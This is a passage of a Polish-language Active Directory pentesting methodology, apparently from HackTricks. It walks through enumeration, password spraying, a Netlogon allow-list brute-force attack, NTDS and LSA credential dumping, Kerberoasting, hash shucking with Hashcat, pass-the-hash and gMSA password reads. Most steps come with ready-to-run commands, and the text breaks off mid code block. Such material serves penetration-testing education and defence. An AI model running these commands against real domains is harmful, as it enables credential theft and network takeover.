# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przegląd

**Active Directory** to podstawowa technologia, która umożliwia **administratorom sieci** efektywne tworzenie i zarządzanie **domenami**, **użytkownikami** oraz **obiektami** w sieci. Została zaprojektowana z myślą o skalowalności, ułatwiając organizowanie dużej liczby użytkowników w łatwe w zarządzaniu **grupy** i **podgrupy**, a jednocześnie kontrolowanie **uprawnień dostępu** na różnych poziomach.

Struktura **Active Directory** składa się z trzech głównych warstw: **domen**, **drzew** i **lasów**. **Domena** obejmuje zbiór obiektów, takich jak **użytkownicy** lub **urządzenia**, które korzystają ze wspólnej bazy danych. **Drzewa** to grupy domen połączonych wspólną strukturą, a **las** to zbiór wielu drzew połączonych za pomocą **relacji zaufania**, tworzący najwyższą warstwę struktury organizacyjnej. Na każdym z tych poziomów można określić konkretne **uprawnienia dostępu** i **komunikacji**.

Kluczowe pojęcia związane z **Active Directory**:

1. **Katalog** – zawiera wszystkie informacje dotyczące obiektów Active Directory.
2. **Obiekt** – oznacza jednostki w katalogu, w tym **użytkowników**, **grupy** lub **foldery udostępnione**.
3. **Domena** – pełni funkcję kontenera na obiekty katalogu. W jednym **lesie** może istnieć wiele domen, z których każda przechowuje własny zbiór obiektów.
4. **Drzewo** – grupa domen współdzielących wspólną domenę główną.
5. **Las** – najwyższy poziom struktury organizacyjnej w Active Directory, składający się z kilku drzew połączonych **relacjami zaufania**.

**Active Directory Domain Services (AD DS)** obejmuje szereg usług kluczowych dla scentralizowanego zarządzania siecią i komunikacji w jej obrębie. Należą do nich:

1. **Domain Services** – centralizuje przechowywanie danych i zarządza interakcjami między **użytkownikami** a **domenami**, w tym funkcjami **uwierzytelniania** i **wyszukiwania**.
2. **Certificate Services** – nadzoruje tworzenie, dystrybucję i zarządzanie bezpiecznymi **certyfikatami cyfrowymi**.
3. **Lightweight Directory Services** – obsługuje aplikacje korzystające z katalogu za pośrednictwem **protokołu LDAP**.
4. **Directory Federation Services** – zapewnia funkcję **single sign-on**, umożliwiając uwierzytelnianie użytkowników w wielu aplikacjach internetowych w ramach jednej sesji.
5. **Rights Management** – pomaga chronić materiały chronione prawem autorskim, ograniczając ich nieautoryzowaną dystrybucję i wykorzystanie.
6. **DNS Service** – ma kluczowe znaczenie dla rozwiązywania **nazw domenowych**.

Bardziej szczegółowe wyjaśnienie znajdziesz tutaj: [**TechTerms - definicja Active Directory**](https://techterms.com/definition/active_directory)

### **Uwierzytelnianie Kerberos**

Aby dowiedzieć się, jak **atakować AD**, musisz dobrze **zrozumieć** proces **uwierzytelniania Kerberos**.\
[**Przeczytaj tę stronę, jeśli nie wiesz jeszcze, jak to działa.**](kerberos-authentication.md)

## Ściągawka

Na stronie [https://wadcoms.github.io/](https://wadcoms.github.io) znajdziesz szybki przegląd poleceń, których możesz użyć do enumeracji lub exploitacji AD.

> [!WARNING]
> Komunikacja Kerberos zazwyczaj **wymaga w pełni kwalifikowanej nazwy domenowej (FQDN)**, aby klient mógł uzyskać bilet dla właściwego SPN. Dostęp do komputera za pomocą adresu IP często powoduje użycie NTLM zamiast Kerberos.

## Rozpoznanie Active Directory (bez poświadczeń/sesji)

Jeśli masz dostęp do środowiska AD, ale nie masz żadnych poświadczeń ani sesji, możesz:

- **Przeprowadzić pentest sieci:**
  - Przeskanuj sieć, znajdź komputery i otwarte porty, a następnie spróbuj **exploitować podatności** lub **wyodrębnić z nich poświadczenia** (na przykład [drukarki mogą być bardzo interesującymi celami](ad-information-in-printers.md)).
  - Enumeracja DNS może dostarczyć informacji o kluczowych serwerach w domenie, takich jak serwery WWW, drukarki, udziały, VPN, multimedia itp.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Zapoznaj się z ogólną [**metodologią pentestów**](../../generic-methodologies-and-resources/pentesting-methodology.md), aby dowiedzieć się więcej o tym, jak to zrobić.
- **Sprawdź dostęp anonimowy i Guest do usług SMB** (nie zadziała to w nowoczesnych wersjach Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Bardziej szczegółowy przewodnik po enumeracji serwera SMB znajdziesz tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumeruj LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Bardziej szczegółowy przewodnik po enumeracji LDAP znajdziesz tutaj (zwróć **szczególną uwagę na dostęp anonimowy**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Zatruj sieć**
  - Zdobądź poświadczenia, [**podszywając się pod usługi za pomocą Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Uzyskaj dostęp do hosta, [**wykorzystując relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Zdobądź poświadczenia, **udostępniając** [**fałszywe usługi UPnP za pomocą evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Wyodrębnij nazwy użytkowników i imiona oraz nazwiska z wewnętrznych dokumentów, mediów społecznościowych, usług (głównie WWW) w środowisku domenowym, a także z publicznie dostępnych źródeł.
  - Jeśli znajdziesz pełne imiona i nazwiska pracowników firmy, możesz wypróbować różne **konwencje nazewnictwa użytkowników** AD ([**przeczytaj ten artykuł**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najczęściej stosowane konwencje to: _NameSurname_, _Name.Surname_, _NamSur_ (po 3 litery z każdego członu), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _losowe litery i 3 losowe cyfry_ (abc123).
  - Narzędzia:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracja użytkowników

- **Anonimowa enumeracja SMB/LDAP:** sprawdź strony dotyczące [**pentestów SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentestów LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeracja Kerbrute**: Gdy serwer otrzyma żądanie dotyczące **nieprawidłowej nazwy użytkownika**, odpowie kodem błędu **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, dzięki czemu możemy ustalić, że nazwa użytkownika jest nieprawidłowa. W przypadku **prawidłowych nazw użytkowników** odpowiedzią będzie albo **TGT w odpowiedzi AS-REP**, albo błąd _KRB5KDC_ERR_PREAUTH_REQUIRED_, wskazujący, że użytkownik musi przejść uwierzytelnianie wstępne.
- **Brak uwierzytelniania w MS-NRPC**: użycie poziomu uwierzytelniania 1 (brak uwierzytelniania) w interfejsie MS-NRPC (Netlogon) na kontrolerach domeny. Po powiązaniu z interfejsem MS-NRPC metoda wywołuje funkcję `DsrGetDcNameEx2`, aby sprawdzić, czy dany użytkownik lub komputer istnieje, bez użycia poświadczeń. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje ten typ enumeracji. Opis badań znajdziesz [tutaj](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Jeśli znajdziesz jeden z tych serwerów w sieci, możesz również przeprowadzić **user enumeration przeciwko niemu**. Na przykład możesz użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Listy nazw użytkowników znajdziesz w [**tym repozytorium GitHub**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) oraz w tym ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Jednak na podstawie rozpoznania przeprowadzonego wcześniej powinieneś mieć **imiona i nazwiska osób pracujących w firmie**. Mając imię i nazwisko, możesz użyć skryptu [**namemash.py**](https://gist.github.com/superkojiman/11076951), aby wygenerować potencjalnie prawidłowe nazwy użytkowników.

### Nadużycie listy dozwolonych podatnych kanałów Netlogon (Onelogon)

Nawet po załataniu **Zerologon** na DC jawnie umieszczone na liście dozwolonych konta nadal mogą być narażone na **starsze/podatne zachowanie bezpiecznego kanału Netlogon**. Ryzykowna konfiguracja to GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** lub odpowiadająca mu wartość rejestru **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta wartość jest **deskryptorem zabezpieczeń SDDL** (zobacz [Security Descriptors](security-descriptors.md)). Celem ataku może być dowolne konto lub grupa, którym przyznano odpowiedni ACE na liście DACL. Na przykład `O:BAG:BAD:(A;;RC;;;WD)` skutecznie dodaje do listy dozwolonych **Everyone**.

Praktyczny przebieg pracy operatora:

1. **Zidentyfikuj podmioty na liście dozwolonych**, sprawdzając zarówno **SYSVOL/GPO**, jak i **rejestr działającego DC**.
2. **Rozwiąż SID-y** znalezione w SDDL do rzeczywistych użytkowników/komputerów AD i nadaj priorytet **kontom maszyn DC**, **kontom zaufania** oraz innym uprzywilejowanym maszynom.
3. Wielokrotnie próbuj **uwierzytelniania MS-NRPC / Netlogon** jako konto z listy dozwolonych.
4. Po poprawnym odgadnięciu nadużyj **ustawiania hasła przez Netlogon**, aby zresetować hasło konta docelowego (publiczny PoC ustawia je na pusty ciąg).<sup>[[9]](#references)[[10]](#references)</sup>

Szybka wstępna ocena / przykłady laboratoryjne z publicznego artefaktu:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notatki:

- **Skaner** jest przydatny, ponieważ efektywna lista dozwolonych może znajdować się w **SYSVOL**, w **rejestrze** lub w obu tych miejscach.
- Sama ścieżka wykorzystania luki jest istotna, ponieważ po zidentyfikowaniu podatnego konta **nie wymaga uprawnień Domain Admin**.
- Przejęcie **konta komputera Domain Controller**, takiego jak `DC$`, jest szczególnie niebezpieczne, ponieważ zresetowanie jego hasła może bezpośrednio umożliwić dalsze ścieżki **przejęcia AD**.
- **Możliwość przeprowadzenia brute force** zależy od trybu: publicznie opisany artefakt przedstawia podejście meet-in-the-middle, **24-bitowy** brute force, gdy dostępne jest inne konto komputera, oraz wolniejsze warianty **32-bitowe**.

Uwagi dotyczące wykrywania i hardeningu:

- Przeprowadź audyt polityki listy dozwolonych i usuń wszystkie wpisy poza tymczasowymi, wyraźnie wymaganymi wyjątkami zgodności.
- Monitoruj zdarzenia **System** **5827/5828/5829/5830/5831** na DC, aby wykrywać sytuacje, w których podatne połączenia Netlogon są blokowane, wykrywane lub jawnie dozwolone przez politykę.
- Traktuj konta na liście `VulnerableChannelAllowList` jako **wysokiego ryzyka**, dopóki zależność od starszej technologii nie zostanie usunięta.

### Znajomość jednej lub kilku nazw użytkowników

Dobrze, znasz już prawidłową nazwę użytkownika, ale nie masz żadnych haseł... W takim razie spróbuj:

- [**ASREPRoast**](asreproast.md): Jeśli użytkownik **nie ma** atrybutu _DONT_REQ_PREAUTH_, możesz **zażądać wiadomości AS_REP** dla tego użytkownika. Będzie ona zawierać dane zaszyfrowane kluczem pochodzącym z hasła użytkownika.
- [**Password Spraying**](password-spraying.md): Spróbujmy **najpopularniejszych haseł** dla każdego z odkrytych użytkowników; być może któryś z nich używa słabego hasła (pamiętaj o polityce haseł!).
  - Możesz też przeprowadzić **spraying** na serwerach OWA, aby spróbować uzyskać dostęp do serwerów pocztowych użytkowników.


{{#ref}}
password-spraying.md
{{#endref}}

### Zatruwanie LLMNR/NBT-NS

Możesz być w stanie **pozyskać** pewne **hashe** challenge-response, zatruwając niektóre protokoły **sieciowe**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Enumeracja Active Directory dostarcza nazw użytkowników, identyfikatorów e-mail i wzorców nazewnictwa, potencjalnych hostów oraz usług, które można skłonić do uwierzytelnienia. Wykorzystaj te informacje, aby zidentyfikować możliwe do przeprowadzenia [**ataki relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM oraz potencjalne ścieżki do środowiska AD.

### Rozpoznanie i sprawdzanie zabezpieczeń relay z użyciem workspace NetExec

- Używaj **workspace `nxcdb`**, aby przechowywać stan rozpoznania AD dla każdego zlecenia: `workspace create <name>` tworzy osobne bazy danych SQLite dla poszczególnych protokołów w `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap itd.). Przełączaj widoki poleceniem `proto smb|mssql|winrm`, a zebrane sekrety wyświetlaj poleceniem `creds`. Po zakończeniu ręcznie usuń poufne dane: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Szybkie rozpoznanie podsieci za pomocą **`netexec smb <cidr>`** ujawnia **domenę**, **kompilację systemu operacyjnego**, **wymagania dotyczące podpisywania SMB** i **Null Auth**. Komputery członkowskie oznaczone `(signing:False)` są **podatne na relay**, natomiast DC często wymagają podpisywania.
- Generuj **nazwy hostów w /etc/hosts** bezpośrednio z wyników NetExec, aby ułatwić targetowanie:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Gdy **SMB relay do DC jest blokowany** przez wymuszanie podpisywania, nadal sprawdź konfigurację **LDAP**: `netexec ldap <dc>` wskazuje `(signing:None)` / słabe channel binding. DC z wymaganym podpisywaniem SMB, ale wyłączonym podpisywaniem LDAP, nadal może być celem **relay-to-LDAP** w atakach takich jak **SPN-less RBCD**.

### Wycieki poświadczeń drukarek po stronie klienta → masowa weryfikacja poświadczeń domenowych

- Interfejsy drukarek i stron WWW czasem **osadzają zamaskowane hasła administratora w HTML**. Wyświetlenie źródła lub użycie narzędzi deweloperskich może ujawnić jawnym tekstem hasło (np. `<input value="<password>">`), umożliwiając dostęp przez Basic-auth do repozytoriów skanów i wydruków.
- Pobrane zadania drukowania mogą zawierać **dokumenty wdrożeniowe w postaci jawnego tekstu** z hasłami poszczególnych użytkowników. Podczas testowania zachowaj zgodność par:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Kradzież poświadczeń NTLM

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów** jako **użytkownik null lub guest**, możesz **umieszczać pliki** (takie jak plik SCF), których otwarcie w jakiś sposób może wyzw**olić uwierzytelnianie NTLM względem Ciebie**, dzięki czemu możesz **ukraść** **wyzwanie NTLM**, aby je złamać:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** traktuje każdy posiadany przez Ciebie hash NT jako kandydujące hasło dla innych, wolniejszych formatów, których materiał kluczowy jest bezpośrednio wyprowadzany z hasha NT. Zamiast brute-force’ować długie frazy hasłowe w ticketach Kerberos RC4, wyzwaniach NetNTLM lub poświadczeniach buforowanych w pamięci podręcznej, przekazujesz hashe NT do trybów NT-candidate w Hashcat i pozwalasz mu sprawdzić, czy hasła są ponownie używane — bez poznawania ich postaci jawnej. Ta metoda jest szczególnie skuteczna po przejęciu domeny, gdy możesz zebrać tysiące aktualnych i historycznych hashy NT.<sup>[[5]](#references)</sup>

Użyj shucking, gdy:

- Masz zbiór hashy NT z DCSync, zrzutów SAM/SECURITY lub magazynów poświadczeń i chcesz sprawdzić, czy są ponownie używane w innych domenach/lasach.
- Przechwytujesz materiał Kerberos oparty na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), odpowiedzi NetNTLM lub bloby DCC/DCC2.
- Chcesz szybko potwierdzić ponowne użycie długich, niemożliwych do złamania fraz hasłowych i od razu wykonać pivot przez Pass-the-Hash.

Ta technika **nie działa** w przypadku typów szyfrowania, których klucze nie są hashem NT (np. Kerberos etype 17/18 AES). Jeśli domena wymusza użycie wyłącznie AES, musisz wrócić do standardowych trybów łamania haseł.

#### Tworzenie zbioru hashy NT

- **DCSync/NTDS** – Użyj `secretsdump.py` z historią, aby pobrać jak największy zbiór hashy NT (wraz z ich poprzednimi wartościami):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Wpisy w historii znacznie poszerzają pulę kandydatów, ponieważ Microsoft może przechowywać do 24 poprzednich hashy dla każdego konta. Więcej sposobów na pozyskanie sekretów NTDS znajdziesz tutaj:

{{#ref}}
dcsync.md
{{#endref}}

- **Zrzuty cache endpointów** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (lub Mimikatz `lsadump::sam /patch`) wyodrębnia lokalne dane SAM/SECURITY oraz zcache'owane logowania do domeny (DCC/DCC2). Usuń duplikaty i dodaj te hashe do tej samej listy `nt_candidates.txt`.
- **Śledź metadane** – Zachowuj nazwę użytkownika/domenę, z których pochodzi każdy hash (nawet jeśli wordlista zawiera wyłącznie wartości hex). Dopasowane hashe od razu wskażą, który principal używa ponownie hasła, gdy Hashcat wyświetli trafiony kandydat.
- Preferuj kandydatów z tego samego lasu lub z zaufanego lasu; zwiększa to szanse na dopasowanie podczas shuckingu.

#### Tryby Hashcat dla kandydatów NT

| Typ hasha                               | Tryb hasła | Tryb kandydatów NT |
| --------------------------------------- | ---------- | ------------------ |
| Domain Cached Credentials (DCC)         | 1100       | 31500              |
| Domain Cached Credentials 2 (DCC2)      | 2100       | 31600              |
| NetNTLMv1 / NetNTLMv1+ESS               | 5500       | 27000              |
| NetNTLMv2                               | 5600       | 27100              |
| Kerberos 5 etype 23 AS-REQ Pre-Auth     | 7500       | _N/A_              |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100      | 35300              |
| Kerberos 5 etype 23 AS-REP              | 18200      | 35400              |

Uwagi:

- Wejściowe dane dla kandydatów NT **muszą pozostać surowymi hashami NT w formacie 32-znakowego hex**. Wyłącz mechanizmy reguł (bez `-r` i trybów hybrydowych), ponieważ modyfikowanie uszkadza materiał klucza kandydata.
- Te tryby nie są z natury szybsze, ale przestrzeń kluczy NTLM (~30 000 MH/s na M3 Max) jest ~100× szybsza niż Kerberos RC4 (~300 MH/s). Testowanie starannie dobranej listy NT jest znacznie tańsze niż przeszukiwanie całej przestrzeni haseł w wolnym formacie.
- Zawsze używaj **najnowszej wersji Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), ponieważ tryby 31500/31600/35300/35400 zostały dodane niedawno.<sup>[[7]](#references)</sup>
- Obecnie nie ma trybu NT dla AS-REQ Pre-Auth, a etypy AES (19600/19700) wymagają hasła w postaci jawnej, ponieważ ich klucze są wyprowadzane przez PBKDF2 z haseł UTF-16LE, a nie z surowych hashy NT.

#### Przykład – Kerberoast RC4 (tryb 35300)

1. Przechwyć RC4 TGS dla docelowego SPN, używając użytkownika o niskich uprawnieniach (szczegóły znajdziesz na stronie Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Shuck the ticket za pomocą swojej listy NT:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat wyprowadza klucz RC4 z każdego kandydata NT i weryfikuje blob `$krb5tgs$23$...`. Dopasowanie potwierdza, że konto usługi używa jednego z Twoich istniejących hashy NT.

3. Natychmiast przejdź do PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   W razie potrzeby możesz później odzyskać tekst jawny za pomocą `hashcat -m 1000 <matched_hash> wordlists/`.

#### Przykład – poświadczenia buforowane (mode 31600)

1. Zrzut buforowanych logowań z przejętej stacji roboczej:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Skopiuj wiersz DCC2 interesującego użytkownika domeny do `dcc2_highpriv.txt` i shuck it:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Pomyślne dopasowanie daje znany już na Twojej liście hash NT, co dowodzi, że użytkownik z pamięci podręcznej ponownie używa tego samego hasła. Użyj go bezpośrednio do PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) albo przeprowadź brute-force w szybkim trybie NTLM, aby odzyskać tekst hasła.

Dokładnie ten sam proces dotyczy odpowiedzi na challenge NetNTLM (`-m 27000/27100`) i DCC (`-m 31500`). Po znalezieniu dopasowania możesz uruchomić relay, PtH przez SMB/WMI/WinRM albo ponownie złamać hash NT offline za pomocą masek/reguł.



## Enumeracja Active Directory Z użyciem poświadczeń/sesji

Na tym etapie musisz mieć **przejęte poświadczenia lub sesję prawidłowego konta domenowego.** Jeśli masz prawidłowe poświadczenia lub powłokę jako użytkownik domenowy, **pamiętaj, że wcześniej wymienione opcje nadal pozwalają przejąć konta innych użytkowników**.

Przed rozpoczęciem uwierzytelnionej enumeracji zapoznaj się z **problemem podwójnego przeskoku Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeracja

Przejęcie konta to **ważny krok w ocenie domeny**, ponieważ umożliwia uwierzytelnioną **enumerację Active Directory**:

W przypadku [**ASREPRoast**](asreproast.md) możesz teraz znaleźć wszystkich potencjalnie podatnych użytkowników, a w przypadku [**Password Spraying**](password-spraying.md) możesz uzyskać **listę wszystkich nazw użytkowników** i wypróbować hasło przejętego konta, puste hasła oraz nowe, obiecujące hasła.

- Możesz użyć [**CMD do przeprowadzenia podstawowego rekonesansu**](../basic-cmd-for-pentesters.md#domain-info)
- Możesz też użyć [**PowerShell do rekonesansu**](../basic-powershell-for-pentesters/index.html), co będzie bardziej dyskretne
- Możesz także [**użyć powerview**](../basic-powershell-for-pentesters/powerview.md), aby uzyskać bardziej szczegółowe informacje
- Innym świetnym narzędziem do rekonesansu w Active Directory jest [**BloodHound**](bloodhound.md). **Nie jest ono zbyt dyskretne** (zależnie od używanych metod zbierania danych), ale **jeśli Ci to nie przeszkadza**, zdecydowanie warto go wypróbować. Sprawdź, gdzie użytkownicy mogą łączyć się przez RDP, znajdź ścieżkę do innych grup itd.
  - **Inne zautomatyzowane narzędzia do enumeracji AD:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Rekordy DNS AD**](ad-dns-records.md), ponieważ mogą zawierać interesujące informacje.
- Do enumeracji katalogu możesz użyć **narzędzia z GUI**: **AdExplorer.exe** z pakietu **SysInternal** Suite.
- Możesz też przeszukać bazę LDAP za pomocą **ldapsearch**, aby znaleźć poświadczenia w polach _userPassword_ i _unixUserPassword_, a także w notatkach _description_ i _info_ użytkowników. Nieopisany ciąg przypominający hasło w polu _info_ jest tylko potencjalnym hasłem: osobno potwierdź jego przeznaczenie i ważność, a podczas rutynowej enumeracji nie wyświetlaj zawartości notatek. Zobacz [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment), aby poznać inne metody.
- Jeśli masz odpowiednie uprawnienia, sprawdź **dostępne** skrypty logowania do domeny i mapowania dysków w lokalizacjach `\\<dc>\NETLOGON` lub `\\<dc>\SYSVOL\<domain>\scripts`. [Dokumentacja Microsoft](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) opisuje rolę udziału NETLOGON jako katalogu skryptów. Najpierw wyświetl nazwy, a następnie sprawdź tylko istotne, dostępne do odczytu skrypty, mieszczące się w ustalonym limicie rozmiaru; nie zrzucaj całego udziału ani nie wyświetlaj wartości poświadczeń podczas rutynowej enumeracji. Wywołanie PowerShell [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **nie chroni** hasła zapisanego w skrypcie jako literał. Samo wywołanie nie dowodzi, że sekret jest zakodowany na stałe: prześledź jego rzeczywiste dane wejściowe, a następnie osobno zweryfikuj konto, ważność poświadczeń i uprawnienia. Skrypt domenowy wymaga sprawdzenia zdalnego udziału — to osobna czynność od enumeracji lokalnego hosta.
- Jeśli używasz **Linuxa**, możesz też przeprowadzić enumerację domeny za pomocą [**pywerview**](https://github.com/the-useless-one/pywerview).
- Możesz również wypróbować zautomatyzowane narzędzia, takie jak:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Wyodrębnianie wszystkich użytkowników domeny**

  Uzyskanie wszystkich nazw użytkowników domeny w Windows jest bardzo łatwe (`net user /domain` ,`Get-DomainUser` lub `wmic useraccount get name,sid`). W Linuxie możesz użyć: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` lub `enum4linux -a -u "user" -p "password" <DC IP>`

> Nawet jeśli sekcja dotycząca enumeracji wydaje się krótka, jest to najważniejsza część całości. Otwórz odnośniki (przede wszystkim do cmd, PowerShell, powerview i BloodHound), naucz się przeprowadzać enumerację domeny i ćwicz, aż nabierzesz wprawy. Podczas oceny będzie to kluczowy moment, który pozwoli Ci znaleźć drogę do DA albo stwierdzić, że nie da się nic zrobić.

### Przewidywalne, wstępnie utworzone konta komputerów -> dostęp do hasła gMSA

Konta komputerów przygotowane na potrzeby starszych metod dołączania do domeny mogą zachować przewidywalne hasło początkowe. Moduł `pre2k` w NetExec identyfikuje charakterystyczną wartość `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) i próbuje uzyskać Kerberos TGT, używając pierwszych 14 znaków nazwy komputera zapisanych małymi literami, bez końcowego `$`. Traktuj tę wartość UAC jako filtr kandydatów, zamiast zakładać, że samo członkostwo w **Pre-Windows 2000 Compatible Access** dowodzi, że hasło jest słabe.<sup>[[18]](#references)[[20]](#references)</sup>

Użyj uwierzytelnionej enumeracji LDAP, aby sprawdzić kandydatów i zapisać uzyskane TGT. `ALL=True` rozszerza testowanie na obiekty spoza domyślnego filtra `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Nieudany bind domyślny/NTLM **nie** unieważnia tego ustalenia: testuj z `-k`, używając FQDN, który rozwiązuje się do DC, oraz zegara zsynchronizowanego z KDC. Pomyślne uruchomienia modułu zapisują listy kandydatów i pozyskane ccaches w `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Po przejęciu principal komputera przeanalizuj jego zagnieżdżone członkostwa w grupach oraz uprawnienia wychodzące. W szczególności principals wymienione w deskryptorze zabezpieczeń `msDS-GroupMSAMembership` obiektu gMSA mogą odczytać `msDS-ManagedPassword`; wynik `--gmsa` w NetExec pokazuje dozwolone principals i zwraca bieżący hash NT, jeśli uwierzytelniający się komputer ma do tego uprawnienia.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

